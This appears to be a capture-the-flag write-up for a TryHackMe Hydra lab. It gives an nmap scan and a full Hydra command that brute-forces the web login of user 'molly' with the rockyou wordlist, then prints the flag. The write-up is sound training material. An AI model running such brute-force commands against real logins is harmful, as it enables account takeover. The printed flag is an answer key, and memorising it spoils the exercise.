# Hydra 

### [Task 2] 

#####  1. Use Hydra to bruteforce molly's web password. What is flag 1?

* Scan open ports
```nmap -sV -sS 10.10.166.155```

![nmap-scan](https://user-images.githubusercontent.com/62840507/128612421-d85ea0f6-64de-454c-ac84-dfb749fe4fa8.png)

* There is a website on port 80. Let's take a look at it. 

![Ekran Görüntüsü (2)](https://user-images.githubusercontent.com/62840507/128612567-faacea6f-38fc-46ab-9c91-991377fbd9d8.png)

* According ot the question the user name is molly and we now need to find her password with hydra.

``` hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.166.155 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V ```

![image](https://user-images.githubusercontent.com/62840507/128612618-53e8b508-20c2-47ac-80ea-1dfd8084c80b.png)


**Solution :** THM{2673a7dd116de68e85c48ec0b1f2612e}
